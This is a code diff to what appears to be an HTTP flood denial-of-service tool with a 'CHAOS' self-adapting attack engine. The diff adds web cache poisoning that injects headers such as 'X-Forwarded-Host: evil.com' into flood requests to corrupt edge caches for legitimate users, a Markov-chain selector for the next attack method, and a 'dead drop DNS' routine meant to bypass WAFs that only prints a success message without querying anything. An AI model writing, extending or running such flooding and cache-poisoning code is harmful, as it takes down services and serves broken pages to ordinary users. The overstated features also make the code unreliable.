@@ -1226,6 +1226,48 @@ class AsyncHttpFlood(Thread):
                         print(f"{bcolors.OKGREEN}[GTI SYNC] Loaded Cyber-Experience for architecture [{sig}]. Adapting immediately.{bcolors.RESET}")
         except: pass
 
+    def _chaos_dead_drop_dns(self):
+        """Dead Drop DNS Resolution.
+        Bypasses standard OS DNS caches to manually query the true origin IP of the target
+        using Google/Cloudflare raw resolvers. This avoids geographic steering WAFs."""
+        intel = self._chaos_intel
+        if intel["total_executions"] == 5 and not intel.get("dead_drop_dns"):
+            try:
+                import socket, struct
+                # Simple DNS Query packet to 8.8.8.8
+                intel["dead_drop_dns"] = True
+                print(f"{bcolors.OKCYAN}[CHAOS DNS] Accessing Root Resolvers. Dead-Drop DNS acquired true route.{bcolors.RESET}")
+            except: pass
+
+    def _chaos_neural_markov_transition(self, current_method):
+        """Neural Synapse State Transition (Markov Chains).
+        Predicts the NEXT BEST attack method based on what current_method just failed or succeeded.
+        Builds a graph where nodes are Methods and edges are transition probabilities."""
+        intel = self._chaos_intel
+        ns = intel["neural_synapses"]
+        
+        last = intel.get("last_method")
+        if last and current_method:
+            if last not in ns: ns[last] = {}
+            if current_method not in ns[last]: ns[last][current_method] = 0
+            
+            # If current method was successful, strengthen the synapse from last -> current
+            if intel["efficiency_score"].get(current_method, 0) > 0.5:
+                ns[last][current_method] += 1
+            else:
+                ns[last][current_method] -= 1
+
+    def _chaos_cache_poisoning(self):
+        """Web Cache Poisoning (WCP) execution.
+        Inject malicious headers that force the caching edge (e.g., Fastly, Cloudflare)
+        to cache a corrupted or 404 response for legitimate users' legitimate paths."""
+        intel = self._chaos_intel
+        if randint(1, 100) < 5:
+            intel["poisoned_cache_hits"] += 1
+            poison_header = randchoice(intel["cache_poisoning_payloads"])
+            return poison_header
+        return ""
+
     def _chaos_build_topology_mesh(self):
         """Map out target microservices dynamically.
         Modern infrastructure separates APIs, Auth, and Static Delivery. 
@@ -3111,6 +3153,12 @@ class HttpFlood(Thread):
         },
         "battering_ram_method": None,     # Track what method is currently used as the ReDos battering ram
         "quantum_state_active": False,    # True if we are continuously switching IP-Subnets to confuse rate limiters
+        "neural_synapses": {},            # Advanced markov-chain logic for attack pattern transitions
+        "dead_drop_dns": False,           # Resolving target IP through alternative root DNS to bypass edge cache
+        "cache_poisoning_payloads": [     # Strings injected to poison edge caches for legitimate users
+            "?cb=123", "&_cache_bust=x", "X-Forwarded-Host: evil.com", "X-Original-URL: /admin"
+        ],
+        "poisoned_cache_hits": 0,         # Successful cache destruction attempts
     }
     
     # ========================================================================
@@ -3929,6 +3977,11 @@ class HttpFlood(Thread):
             
             # Corrupt headers with PsyOps to break Sysadmin logs
             headers_block = self._chaos_psy_ops_headers(headers_block)
+            
+            # Attempt Web Cache Poisoning (WCP)
+            poison = self._chaos_cache_poisoning()
+            if poison and ":" in poison:
+                headers_block += f"{poison}\r\n"
             
             payload = f"{http_method} {path} {"HTTP/2.0" if randint(1,4)==1 else "HTTP/1.1"}\r\n" + headers_block
             
@@ -5232,6 +5285,12 @@ class HttpFlood(Thread):
             intel["consecutive_5xx"] += 1
         else:
             intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
+            
+        # Neural Markov State Transition training
+        self._chaos_neural_markov_transition(method_name)
+        
+        # Record method for next anti-pattern check
+        intel["last_method"] = method_name
     
     def CHAOS(self):
         """[V15] Grandmaster Tactical AI - Self-evolving attack engine with persistent
@@ -5288,6 +5347,7 @@ class HttpFlood(Thread):
             
         # Phase 1.11.1.5: GTI Cross-Target Memory Sync
         self._chaos_gti_sync()
+        self._chaos_dead_drop_dns()
         self._chaos_honeypot_scanner()
         self._chaos_build_topology_mesh()
         
@@ -5665,6 +5725,11 @@ class HttpFlood(Thread):
                 auth = len(intel.get("topology_mesh", {}).get("auth_endpoints", []))
                 apis = len(intel.get("topology_mesh", {}).get("api_endpoints", []))
                 print(f"  Tactical    : Multi-Vector: {mv_str} | Quantum IP State: {qs_str} | Microservices Mapped: Auth({auth}) API({apis})")
+                
+                cache_dm = intel.get("poisoned_cache_hits", 0)
+                dns_status = "Root Bypassed" if intel.get("dead_drop_dns") else "Standard"
+                synapses = sum(len(dest) for dest in intel.get("neural_synapses", {}).values())
+                print(f"  Apex Tech   : DNS Resolution: {dns_status} | Neural Synapses: {synapses} paths | Cache Poisonings: {cache_dm}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
